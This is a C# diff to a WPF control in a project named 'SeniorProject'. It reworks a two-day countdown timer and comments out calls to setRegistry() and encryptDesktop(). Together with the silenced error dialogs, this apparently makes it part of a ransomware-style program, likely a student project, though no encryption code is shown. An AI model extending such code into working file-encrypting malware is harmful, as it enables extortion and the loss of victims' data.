@@ -17,33 +17,49 @@ namespace SeniorProject
 	/// </summary>
 	public partial class mainView : UserControl
 	{
-		private DispatcherTimer _timer;
-		private TimeSpan _time;
+		private DispatcherTimer _timer { get; set; }
+		private TimeSpan _time { get; set; }
+		private System.Timers.Timer timeTimer = new System.Timers.Timer();
 
 		public mainView()
 		{
 			InitializeComponent();
-			
 
 			_time = TimeSpan.FromDays(2);
 
-			_timer = new DispatcherTimer(_time, DispatcherPriority.Normal, delegate
-			{
-				tbTime.Content = _time.ToString("c");
-				if (_time == TimeSpan.Zero) _timer.Stop();
-
-				_time = _time.Add(TimeSpan.FromSeconds(-1));
-			}, Dispatcher);
-
-			Dispatcher.Invoke(() => { tbTime.Content = _time.ToString("c"); });
-			
+			timeTimer.Elapsed += TimeTimer_Elapsed;
+			timeTimer.Interval = 1000;
+			timeTimer.Start();
+			/*
 			setRegistry();
 
 			Encryption encryption = new Encryption();
 			encryption.encryptDesktop();
+            */
+
+
 		}
 
+		void Countdown(int count, TimeSpan interval, Action<int> ts)
+		{
+			var dt = new System.Windows.Threading.DispatcherTimer();
+			dt.Interval = interval;
+			dt.Tick += (_, a) =>
+			{
+				if (count-- == 0)
+					dt.Stop();
+				else
+					ts(count);
+			};
+			ts(count);
+			dt.Start();
+		}
 
+		private void TimeTimer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
+		{
+			_time = _time - TimeSpan.FromSeconds(1);
+			Dispatcher.Invoke(() => { tbTime.Content = _time.ToString("c"); });
+		}
 
 		private static void setRegistry()
 		{
@@ -66,8 +82,8 @@ namespace SeniorProject
 			}
 			catch (Exception ex)
 			{
-				MessageBox.Show(ex.Message);
-				MessageBox.Show(ex.InnerException.ToString());
+				//MessageBox.Show(ex.Message);
+				//MessageBox.Show(ex.InnerException.ToString());
 			}
 		}
 	}
